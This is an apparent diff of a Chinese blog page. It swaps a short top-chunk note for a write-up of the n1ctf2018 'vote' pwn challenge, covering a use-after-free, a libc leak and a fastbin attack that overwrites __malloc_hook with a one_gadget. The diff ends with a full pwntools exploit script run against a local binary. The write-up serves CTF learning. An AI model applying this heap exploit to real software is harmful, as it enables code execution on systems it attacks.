@@ -8,22 +8,32 @@
 
 <title>
   
-    CTF中的一点小疑惑
+    n1ctf2018 vote解题
   
 </title>
 
-<meta name="description" content="关于top chunk的问题笔记覆盖TOP chunksize小于0x1000后，使top chunk脱落下来成为unsorted chunk的问题。如将top chunk size覆盖为0xfa1,此时申请0x1000可以使top chunk变为unsorted chunk，不断申请0x90的chunk，最后会产生异常情况。 补充：因为top chunk 小于0x90后不会放入unsorted">
-<meta name="keywords" content="CTF">
+<meta name="description" content="前言旧题重做，最近更新的有点慢。做的是n1ctf2018中的vote题目。">
+<meta name="keywords" content="-- CTF">
 <meta property="og:type" content="article">
-<meta property="og:title" content="CTF中的一点小疑惑">
-<meta property="og:url" content="http://yoursite.com/2018/07/25/CTF中的一点小疑惑/index.html">
+<meta property="og:title" content="n1ctf2018 vote解题">
+<meta property="og:url" content="http://yoursite.com/2018/08/18/n1ctf2018-vote解题/index.html">
 <meta property="og:site_name" content="pwndog&#39;s blog">
-<meta property="og:description" content="关于top chunk的问题笔记覆盖TOP chunksize小于0x1000后，使top chunk脱落下来成为unsorted chunk的问题。如将top chunk size覆盖为0xfa1,此时申请0x1000可以使top chunk变为unsorted chunk，不断申请0x90的chunk，最后会产生异常情况。 补充：因为top chunk 小于0x90后不会放入unsorted">
+<meta property="og:description" content="前言旧题重做，最近更新的有点慢。做的是n1ctf2018中的vote题目。">
 <meta property="og:locale" content="CN">
-<meta property="og:updated_time" content="2018-07-26T05:58:00.902Z">
+<meta property="og:image" content="http://yoursite.com/2018/08/18/n1ctf2018-vote解题/1.png">
+<meta property="og:image" content="http://yoursite.com/2018/08/18/n1ctf2018-vote解题/2.png">
+<meta property="og:image" content="http://yoursite.com/2018/08/18/n1ctf2018-vote解题/3.png">
+<meta property="og:image" content="http://yoursite.com/2018/08/18/n1ctf2018-vote解题/4.png">
+<meta property="og:image" content="http://yoursite.com/2018/08/18/n1ctf2018-vote解题/5.png">
+<meta property="og:image" content="http://yoursite.com/2018/08/18/n1ctf2018-vote解题/6.png">
+<meta property="og:image" content="http://yoursite.com/2018/08/18/n1ctf2018-vote解题/7.png">
+<meta property="og:image" content="http://yoursite.com/2018/08/18/n1ctf2018-vote解题/8.png">
+<meta property="og:image" content="http://yoursite.com/2018/08/18/n1ctf2018-vote解题/9.png">
+<meta property="og:updated_time" content="2018-08-18T14:41:47.072Z">
 <meta name="twitter:card" content="summary">
-<meta name="twitter:title" content="CTF中的一点小疑惑">
-<meta name="twitter:description" content="关于top chunk的问题笔记覆盖TOP chunksize小于0x1000后，使top chunk脱落下来成为unsorted chunk的问题。如将top chunk size覆盖为0xfa1,此时申请0x1000可以使top chunk变为unsorted chunk，不断申请0x90的chunk，最后会产生异常情况。 补充：因为top chunk 小于0x90后不会放入unsorted">
+<meta name="twitter:title" content="n1ctf2018 vote解题">
+<meta name="twitter:description" content="前言旧题重做，最近更新的有点慢。做的是n1ctf2018中的vote题目。">
+<meta name="twitter:image" content="http://yoursite.com/2018/08/18/n1ctf2018-vote解题/1.png">
 
 
   <link rel="alternative" href="/atom.xml" title="pwndog&#39;s blog" type="application/atom+xml">
@@ -151,31 +161,73 @@
       
         <div style="max-width: 1000px">
       
-          <article id="post-CTF中的一点小疑惑" class="article article-type-post">
+          <article id="post-n1ctf2018-vote解题" class="article article-type-post">
   
     <h1 class="article-header">
-      CTF中的一点小疑惑
+      n1ctf2018 vote解题
     </h1>
   
   
 
   <div class="article-info">
     <span class="article-date">
-  2018-07-25
+  2018-08-18
 </span>
 
     
 
     
 	<span class="article-tag tagcloud">
-		<ul class="article-tag-list"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/CTF/">CTF</a></li></ul>
+		<ul class="article-tag-list"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/CTF/">-- CTF</a></li></ul>
 	</span>
 
 
   </div>
   <div class="article-entry">
-    <h3 id="关于top-chunk的问题笔记"><a href="#关于top-chunk的问题笔记" class="headerlink" title="关于top chunk的问题笔记"></a>关于top chunk的问题笔记</h3><p>覆盖TOP chunksize小于0x1000后，使top chunk脱落下来成为unsorted chunk的问题。<br>如将top chunk size覆盖为0xfa1,此时申请0x1000可以使top chunk变为unsorted chunk，不断申请0x90的chunk，最后会产生异常情况。</p>
-<h3 id="补充："><a href="#补充：" class="headerlink" title="补充："></a>补充：</h3><p>因为top chunk 小于0x90后不会放入unsorted bin，会放入fast bin 链表。。</p>
+    <h3 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h3><p>旧题重做，最近更新的有点慢。做的是n1ctf2018中的vote题目。<br><a id="more"></a></p>
+<h3 id="程序保护"><a href="#程序保护" class="headerlink" title="程序保护"></a>程序保护</h3><p><img src="/2018/08/18/n1ctf2018-vote解题/1.png" alt=""><br>常规保护，开启了nx和canary。</p>
+<h3 id="程序功能"><a href="#程序功能" class="headerlink" title="程序功能"></a>程序功能</h3><p><img src="/2018/08/18/n1ctf2018-vote解题/2.png" alt=""><br>常规菜单题，有五个功能，create，vote，result，canel，show。事实上我只用了create，show和canel。剩下的功能没有用。<br><img src="/2018/08/18/n1ctf2018-vote解题/3.png" alt=""><br>create功能。创建不超过4096大小的堆块。堆块的前16个字节不能写入。前8个字节用来vote，result功能.后八个字节保存当前时间<br><img src="/2018/08/18/n1ctf2018-vote解题/4.png" alt=""><br>show功能。将堆块内容输出。<br><img src="/2018/08/18/n1ctf2018-vote解题/5.png" alt=""><br>vote功能。将堆块第一个dword值+1.将当前时间写入后八个字节。然后将一个数组的对应索引的值+1。<br><img src="/2018/08/18/n1ctf2018-vote解题/6.png" alt=""><br>result功能。将数组中每个索引对应的值输出。<br><img src="/2018/08/18/n1ctf2018-vote解题/7.png" alt=""><br>canel功能。漏洞函数。存在uaf漏洞</p>
+<h3 id="信息泄露"><a href="#信息泄露" class="headerlink" title="信息泄露"></a>信息泄露</h3><p>由于堆的前16个字节会在创建时被修改。通过uaf漏洞+unsorted chunk泄露出libc地址。题目给了libc程序。所以直接可以求出基址。</p>
+<h3 id="漏洞利用"><a href="#漏洞利用" class="headerlink" title="漏洞利用"></a>漏洞利用</h3><p>题目的难点设置在堆的前16个字节不可控.由于程序存在uaf漏洞及堆的大小可控。于是可以使用fastbin attack。难点在于如何修改free后chunk的fd指针。<br><img src="/2018/08/18/n1ctf2018-vote解题/8.png" alt=""><br>先伪造两个uaf指针。通过一个malloc后伪造两个指针一个为0x201，一个为0x71.使上面的伪造堆块包含下面的fast chunk。<br>伪造完成后，free a,free b.<br>再申请一个大小满足0x200的堆块就会将伪造堆块从unsorted bin中拆除下来。就可以修改free后chunk的fd指针。<br>通过将malloc_hook修改为one_gadget。利用成功。<br><img src="/2018/08/18/n1ctf2018-vote解题/9.png" alt=""></p>
+<h3 id="脚本"><a href="#脚本" class="headerlink" title="脚本"></a>脚本</h3><pre><code class="python"><span class="keyword">from</span> pwn <span class="keyword">import</span> *
+p=process([<span class="string">'./vote'</span>],env={<span class="string">'LD_PRELOAD'</span>:<span class="string">'./libc-2.23.so'</span>})
+e=ELF(<span class="string">'./libc-2.23.so'</span>)
+<span class="function"><span class="keyword">def</span> <span class="title">create</span><span class="params">(a,b)</span>:</span>
+    p.writeline(<span class="string">'0'</span>)
+    p.readuntil(<span class="string">'Please enter the name\'s size:'</span>)
+    p.writeline(str(a))
+    p.readuntil(<span class="string">'Please enter the name:'</span>)
+    p.writeline(b)
+    p.readuntil(<span class="string">'Action:'</span>)
+<span class="function"><span class="keyword">def</span> <span class="title">dele</span><span class="params">(a)</span>:</span>
+    p.writeline(<span class="string">'4'</span>)
+    p.readuntil(<span class="string">'Please enter the index:'</span>)
+    p.writeline(str(a))
+    p.readuntil(<span class="string">'Action:'</span>)
+context(log_level=<span class="string">'debug'</span>)
+create(<span class="number">128</span>,<span class="string">'123'</span>)
+create(<span class="number">128</span>,<span class="string">'123'</span>)
+create(<span class="number">128</span>,<span class="string">'123'</span>)
+dele(<span class="number">0</span>)
+
+p.writeline(<span class="string">'1'</span>)
+p.readuntil(<span class="string">'Please enter the index:'</span>)
+p.writeline(<span class="string">'0'</span>)
+p.readuntil(<span class="string">'count: '</span>)
+base=int(p.readuntil(<span class="string">'\n'</span>)[:<span class="number">-1</span>],<span class="number">10</span>)
+libc=base<span class="number">-0x3C4B78</span>
+malloc_hook=libc+e.symbols[<span class="string">'__malloc_hook'</span>]
+<span class="keyword">print</span> hex(base)
+dele(<span class="number">1</span>)
+dele(<span class="number">2</span>)
+create(<span class="number">0x500</span>,chr(<span class="number">0</span>)*<span class="number">0x88</span>+p64(<span class="number">0x201</span>)+chr(<span class="number">0</span>)*<span class="number">0x98</span>+p64(<span class="number">0x71</span>)+chr(<span class="number">0</span>)*<span class="number">0x68</span>+p64(<span class="number">0xf1</span>)+chr(<span class="number">0</span>)*<span class="number">0xe8</span>+p64(<span class="number">0x281</span>))
+dele(<span class="number">1</span>)
+dele(<span class="number">2</span>)
+create(<span class="number">0x1e0</span>,chr(<span class="number">0</span>)*<span class="number">0x88</span>+p64(<span class="number">0x71</span>)+p64(malloc_hook<span class="number">-0x23</span>))
+create(<span class="number">0x50</span>,<span class="string">'aaaaa'</span>)
+create(<span class="number">0x50</span>,<span class="string">'aaa'</span>+p64(libc+<span class="number">0xf1117</span>))
+p.interactive()
+</code></pre>
 
   </div>
   <footer class="article-footer">
